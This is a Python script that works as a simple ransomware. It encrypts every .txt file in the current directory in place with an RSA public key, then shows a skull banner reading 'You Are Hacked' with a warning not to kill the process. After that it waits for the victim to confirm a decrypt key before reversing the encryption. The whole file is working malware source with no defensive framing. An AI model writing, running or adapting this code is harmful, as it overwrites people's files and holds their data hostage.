import os
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend 
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes


files = os.listdir()

def decrypt(encrypted):
    with open("private_key.pem", "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )
        decrypted = private_key.decrypt(
        base64.b64decode(encrypted),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted

def encrypt(plaintext):
    with open("public_key.pem", "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
    encrypted = base64.b64encode(public_key.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    ))
    return encrypted

def encryption():
    for file in files:
        if file.endswith(".txt"):
            f = open(file,"rb")
            plaintext = f.read()
            f = open(file,"wb")
            encrypted_txt = encrypt(plaintext)
            f.write(encrypted_txt)
            # print(encrypted_txt)
            

def decryption():
    for file in files:
        if file.endswith(".txt"):
            f = open(file,"rb")
            encrypted = f.read()
            f = open(file,"wb")
            decrypted_txt = decrypt(encrypted)
            f.write(decrypted_txt)
            # print(decrypted_txt)
skull = '''
                     ______
                  .-"      "-.
                 /            \\
                |              |
                |,  .-.  .-.  ,|
           /\   | )(__/  \__)( |
         _ \/   |/     /\     \|
        \_\/    (_     ^^     _)   .-==/~\\
       ___/_,__,_\__|IIIIII|__/__)/   /{~}}
       ---,---,---|-\IIIIII/-|---,\'-' {{~}
                  \          /     '-==\}/
                   `--------`
'''
try: 
    print(skull)
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    print("\n You Are Hacked \n")
    print("\n Don't Kill The Process You Will Not be Able to Recover Data\n")
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n\n")

    encryption()
    try:
        print(" ************************************ ")
        print("Have you added Decrypt Key (Yes/No) : ")
        userInput = input()
        while userInput.lower() == "no":
            userInput = input()
        decryption()
    except Exception as e:
        print("Decryption Failed")

except Exception as e:
    print("Encryption Failed")
    print("Damn Failed Attempt")

